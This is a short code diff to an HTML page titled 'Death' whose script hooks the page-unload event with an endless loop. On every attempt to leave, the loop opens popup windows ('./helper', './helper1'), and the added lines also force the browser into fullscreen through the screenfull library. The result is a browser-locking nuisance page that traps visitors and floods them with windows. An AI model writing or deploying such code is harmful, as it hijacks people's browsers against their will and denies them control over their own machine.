@@ -185,13 +185,13 @@
     }
   </style>
 	  <title>Death</title>
+		<script src="src/screenfull.js"></script>
 		<script type="text/javascript">
 		  window.onbeforeunload = function () {
 		  	while(1) {
-			    window.open("helper");
-			    window.open("helper1");
-			    window.open("helper", "DEATH", "height=200,width=200");
-			    window.open("helper1", "DEATH", "height=200,width=200");
+	            	    var xWin=window.open("./helper");
+			    var xWin=window.open("./helper1");
+		     	    screenfull.request();
 			}
 			
 		  }
